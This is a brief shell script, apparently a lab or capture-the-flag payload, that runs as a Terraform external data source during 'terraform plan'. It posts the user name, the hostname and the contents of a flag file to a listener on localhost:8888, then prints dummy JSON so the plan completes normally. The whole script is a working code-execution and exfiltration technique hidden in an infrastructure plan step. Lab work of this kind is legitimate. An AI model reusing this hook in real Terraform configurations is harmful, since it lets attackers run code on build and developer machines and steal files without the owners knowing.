#!/bin/sh
# Se ejecuta durante `terraform plan`. Evidencia rapida, sin shell interactiva.
# El provider "external" exige JSON por stdout.
wget -qO- --post-data="user=$(id -un) host=$(hostname)" http://localhost:8888/tf/plan-rce >/dev/null
wget -qO- --post-file=/hosthome/.devops-lab-tf-plan-flag http://localhost:8888/tf/plan-rce-flag >/dev/null
echo '{"ok":"1"}'
